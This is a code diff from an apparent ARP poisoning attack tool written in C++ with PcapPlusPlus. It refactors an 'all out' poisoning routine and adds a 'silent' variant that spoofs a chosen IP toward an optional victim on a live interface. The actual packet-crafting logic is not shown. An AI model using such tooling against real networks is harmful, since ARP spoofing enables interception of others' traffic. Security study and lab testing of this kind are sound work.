@@ -1,17 +1,20 @@
 #include "arp_poisoning/public.h"
+#include "IpAddress.h"
 #include "MacAddress.h"
 #include "PcapLiveDevice.h"
 #include "PcapLiveDeviceList.h"
 #include "arp_poisoning/all_out.h"
 #include "arp_poisoning/arp_poisoning_strategy.h"
+#include "arp_poisoning/silent.h"
 #include <memory>
 #include <stdexcept>
+#include <utility>
 
 /**
  * In the current implementation this method will not terminate and keep
  * peforming the attack.
  */
-void ATK::ARP::allOutPoison(const AllOutPoisonOptions &options) {
+void ATK::ARP::allOutPoison(const AllOutPoisoningOptions &options) {
     pcpp::PcapLiveDevice *device =
         pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
             options.ifaceIpOrName);
@@ -21,16 +24,47 @@ void ATK::ARP::allOutPoison(const AllOutPoisonOptions &options) {
                                     " is not a valid interface");
     }
 
-    std::unique_ptr<ATK::ARP::AllOutArpPoisoningStrategy> strategy;
-    if (!options.attackerMac.empty()) {
+    ATK::ARP::AllOutArpPoisoningStrategy::Builder builder(device);
 
-        pcpp::MacAddress macAddress(options.attackerMac);
-        strategy = AllOutArpPoisoningStrategy::Builder(device)
-                       .attackerMac(macAddress)
-                       .build();
-    } else {
-        strategy = AllOutArpPoisoningStrategy::Builder(device).build();
+    if (options.attackerMac.has_value()) {
+        const pcpp::MacAddress macAddress(options.attackerMac.value());
+        builder = builder.attackerMac(macAddress);
     }
+
+    std::unique_ptr<ATK::ARP::AllOutArpPoisoningStrategy> strategy =
+        builder.build();
+
+    ArpPoisoningContext arpPoisoningContext(std::move(strategy));
+
+    arpPoisoningContext.execute();
+}
+
+void ATK::ARP::silentPoison(const SilentPoisoningOptions &options) {
+    pcpp::PcapLiveDevice *device =
+        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
+            options.ifaceIpOrName);
+
+    if (device == nullptr) {
+        throw std::invalid_argument(options.ifaceIpOrName +
+                                    " is not a valid interface");
+    }
+
+    const pcpp::IPv4Address ipToSpoof(options.ipToSpoof);
+
+    ATK::ARP::SilentArpPoisoningStrategy::Builder builder(device, ipToSpoof);
+
+    if (options.attackerMac.has_value()) {
+        const pcpp::MacAddress macAddress(options.attackerMac.value());
+        builder = builder.attackerMac(macAddress);
+    }
+
+    if (options.victimIp.has_value()) {
+        const pcpp::IPv4Address victimIp(options.victimIp.value());
+        builder = builder.victimIp(victimIp);
+    }
+
+    std::unique_ptr<ATK::ARP::SilentArpPoisoningStrategy> strategy =
+        builder.build();
 
     ArpPoisoningContext arpPoisoningContext(std::move(strategy));
 
